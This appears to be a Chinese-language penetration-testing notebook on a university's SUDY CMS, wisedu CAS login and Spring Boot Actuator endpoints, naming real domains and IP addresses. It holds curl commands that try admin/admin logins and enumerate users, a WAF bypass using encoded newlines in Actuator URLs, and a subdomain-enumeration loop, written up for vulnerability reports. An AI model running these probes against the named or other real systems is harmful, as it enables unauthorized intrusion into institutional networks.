# SUDY网站管理平台 + 金智教育(wisedu) CAS 测试模式 (2026-05)

目标: 南京医科大学康达学院 (kdc.njmu.edu.cn) — SUDY CMS + 金智教育CAS + Spring Boot

## SUDY CMS指纹识别

```
特征:
- JS: sudy-wp-context, sudy-wp-siteId="164"
- CSS: /_js/_portletPlugs/sudyNavi/css/sudyNav.css
- JS: /_js/jquery.sudy.wp.visitcount.js
- JS: /_js/_portletPlugs/sudyNavi/jquery.sudyNav.js
- Server头: ****** (隐藏)
- X-Frame-Options: SAMEORIGIN
```

## SUDY CMS关键路径

### IDS身份认证API
```
POST /_web/_ids/login/api/login/create.rst
Content-Type: application/x-www-form-urlencoded
Body: username=admin&password=admin
→ {"status":0} (登录失败)
→ {"status":0,"message":"无效的登录请求"} (使用无效_p参数)

_p参数: Base64编码,格式为 as=164&t=898&d=3108&p=1&m=SN
解码: echo "YXM9MTY0JnQ9ODk4JmQ9MzEwOCZwPTEmbT1TTiY_" | base64 -d
编码: echo -n "as=164&t=898&p=1&m=N" | base64 | tr '+/' '-_' | tr -d '='

登出: POST /_web/_ids/login/api/logout/create.rst?_p=YXM9MQ__
```

### Portal API (PSP文件)
```
/_web/_portal/api/user/main.psp → 200 (返回HTML)
/_web/_portal/api/login/main.psp → 200
/_web/_portal/api/config/main.psp → 200
/_web/_portal/api/system/main.psp → 200
/_web/_portal/api/page/main.psp → 200
/_web/_portal/api/portlet/main.psp → 200
/_web/_portal/api/template/main.psp → 200
/_web/_portal/api/layout/main.psp → 200

注意: 这些PSP文件返回HTML错误页面,不是JSON API
错误页面泄露客户端IP: <input id="ipAddress" value="61.139.70.105"/>
```

### 搜索API
```
/_web/_search/api/search/new.rst → 搜索接口
/_web/_search/api/search/new.psp → PSP版本
/_web/_search/api/search/hot.rst → 热词
/_web/_search/api/search/suggest.rst → 建议
```

### Admin路径
```
/_admin/ → 403 (存在但被保护)
/admin/ → 302 → /admin/main.psp
/admin/login.psp → 410 Gone (管理后台已禁用)
/admin/main.psp → 410 Gone
/admin/default.psp → 410 Gone
/system/ → 403
/manager/ → 301
/login.jsp → 200 (登录页面)
```

### Admin 410页面IP泄露 (2026-06 sxri.net确认)
```
GET /admin/login.psp → 410 Gone (2335 bytes)
页面包含服务器真实IP: 216.195.192.148
IP出现在HTML的隐藏字段或JS变量中

验证:
curl -sk "https://TARGET/admin/login.psp" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"
→ 216.195.192.148

注意: 410 Gone表示管理后台已被管理员禁用，但页面仍可访问且泄露IP
所有使用SUDY CMS的子域都存在此问题(10+子域统一泄露同一IP)
```

### 编辑器路径
```
/kindeditor/ → 410 (Gone)
/ueditor/ → 410
/ewebeditor/ → 410
/fckeditor/ → 410
```

## 金智教育(wisedu) CAS平台

### 指纹识别
```
Server: wisedu
登录页面: Unified identity authentication platform
路径: /authserver/login
JS: /authserver/cumt/static/common/encrypt.js (SM2加密)
JS: /authserver/cumt/static/web/js/login.js
JS: /authserver/cumt/static/web/js/fido.js (生物识别)
```

### CAS协议端点
```
/authserver/serviceValidate?ticket=ST-xxx&service=xxx → CAS票据验证
/authserver/proxyValidate?ticket=ST-xxx&service=xxx → CAS代理验证
/authserver/proxy?targetService=xxx&pgt=PGT-xxx → CAS代理
/authserver/login?service=xxx → CAS登录(支持service参数)

CAS响应格式:
<cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
    <cas:authenticationFailure code="INVALID_TICKET">Ticket 'ST-1234' not recognized</cas:authenticationFailure>
</cas:serviceResponse>
```

### 用户枚举
```
POST /authserver/login
Content-Type: application/x-www-form-urlencoded
Body: username=admin&password=test

所有用户名返回: "您的账号尚未激活，请激活后登录！"
(用于确认用户存在)
```

### 信息泄露
```
登录页面泄露:
- 其他学校authserver: authserver.xzhmu.edu.cn/personalInfo
- 登录方式: 账号登录/手机登录/二维码登录/生物识别登录
- CAS协议端点: /serviceValidate, /proxyValidate
```

## Spring Boot Actuator (8080端口)

### 发现
```
http://TARGET:8080/actuator → 200 (返回links)
http://TARGET:8080/actuator/health → 503 {"status":"DOWN"}

其他端点返回410 (Gone):
/swagger-ui/, /druid/, /console/, /h2-console/, /api/, /admin/
```

### ehall系统Actuator (带WAF)
```
http://ehall.nmukd.edu.cn/actuator → 200
http://ehall.nmukd.edu.cn/actuator/health → 200
http://ehall.nmukd.edu.cn/actuator/env → 200
http://ehall.nmukd.edu.cn/actuator/mappings → 200
http://ehall.nmukd.edu.cn/actuator/beans → 200
http://ehall.nmukd.edu.cn/actuator/configprops → 200
http://ehall.nmukd.edu.cn/actuator/loggers → 200
http://ehall.nmukd.edu.cn/actuator/heapdump → 200

WAF拦截: 返回"访问禁止" + 事件编号
URL编码绕过: /actuator/env%0a, /actuator/env%09, /actuator/env%0d → 200
但内容仍被WAF拦截(返回空或WAF页面)
```

## 子域名枚举模式

### 同IP子域名 (SUDY CMS)
```
kdc.njmu.edu.cn → siteId=164 (康达学院)
kdclib.njmu.edu.cn → siteId=338 (图书馆)
kdjw.njmu.edu.cn → siteId=169 (教务办)
kdxg.njmu.edu.cn → siteId=170 (学生工作处)
kdtw.njmu.edu.cn → siteId=162 (团委)
kdjjjc.njmu.edu.cn → siteId=286 (纪委)
```

### 其他子域名
```
www.njmu.edu.cn → 202.195.176.21
mail.njmu.edu.cn → 202.195.181.187
vpn.njmu.edu.cn → 218.94.72.98
oa.njmu.edu.cn → 202.195.176.19
webvpn.njmu.edu.cn → 202.195.188.233
ids.njmu.edu.cn → 202.195.176.25
app.njmu.edu.cn → 202.195.176.38
ehall.nmukd.edu.cn → 198.18.0.38 (金智教育平台)
authserver.nmukd.edu.cn → CAS认证服务器
```

## 确认可提交漏洞

### 1. [中危] ehall Spring Boot Actuator端点暴露
- 端点: env/health/info/loggers/mappings/beans/configprops/heapdump
- 影响: 泄露数据库凭证/API密钥/堆转储
- WAF拦截但URL编码绕过可行

### 2. [中危] CAS认证服务器信息泄露
- 泄露Server: wisedu
- 泄露其他学校authserver
- 泄露CAS协议端点

### 3. [中危] CAS用户枚举
- 所有用户名返回"账号未激活"
- 可枚举有效用户

### 4. [中危] SUDY CMS错误页面泄露客户端IP
- <input id="ipAddress" value="61.139.70.105"/>
- 2026-05-29 NJMU验证: value="216.195.192.148" (代理后的真实IP)

### 5. [中危] 8080端口Spring Boot Actuator暴露
- /actuator → 200 (返回links JSON)
- /actuator/health → 503 {"status":"DOWN"}

## ⚠️ 重要陷阱: HTTP 200 ≠ 实际可访问

**2026-05-29 NJMU验证教训**: ehall.nmukd.edu.cn的Actuator端点返回HTTP 200状态码,但实际内容是WAF拦截页面(888字节"访问禁止")。URL编码绕过(%0a/%09/%0d等)同样返回200但内容仍被WAF拦截。

**验证方法**: 必须检查响应体内容,不能只看状态码:
```bash
# 错误做法: 只看状态码
curl -sk -o /dev/null -w "%{http_code}" "http://target/actuator/env%0a"
→ 200 (误判为可访问)

# 正确做法: 检查实际内容
curl -sk "http://target/actuator/env%0a" | head -c 200
→ <HTML><HEAD><TITLE>访问禁止</TITLE>... (实际被拦截)

# 正确做法: 检查内容大小
curl -sk -o /dev/null -w "%{http_code}:%{size_download}" "http://target/actuator/env%0a"
→ 200:888 (888字节是WAF页面,不是Actuator数据)
```

**判断标准**:
- Actuator env端点正常响应应 > 10KB (包含大量配置)
- Actuator health端点正常响应应 < 100B (如 {"status":"UP"})
- WAF拦截页面通常 800-1000B
- 如果响应体包含"访问禁止"、"Forbidden"、事件编号等关键词,则是WAF拦截

**结论**: ehall Actuator被WAF完全拦截,URL编码绕过无效。该漏洞不建议提交。

## 测试命令汇总

```bash
# SUDY CMS指纹
curl -sk https://TARGET/ | grep -i "sudy"

# IDS登录API
curl -sk -X POST "https://TARGET/_web/_ids/login/api/login/create.rst" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin"

# PSP文件测试
curl -sk "https://TARGET/_web/_portal/api/user/main.psp"

# CAS登录
curl -sk "http://authserver.nmukd.edu.cn/authserver/login"

# CAS票据验证
curl -sk "http://authserver.nmukd.edu.cn/authserver/serviceValidate?ticket=ST-1234&service=http://ehall.nmukd.edu.cn/"

# Actuator测试
curl -sk "http://TARGET:8080/actuator"
curl -sk "http://ehall.nmukd.edu.cn/actuator/env%0a"

# 子域名枚举
for sub in www mail vpn oa jw jwc lib webvpn ids ehall; do
  ip=$(dig +short "${sub}.njmu.edu.cn" 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "[+] ${sub}.njmu.edu.cn → $ip"
done
```
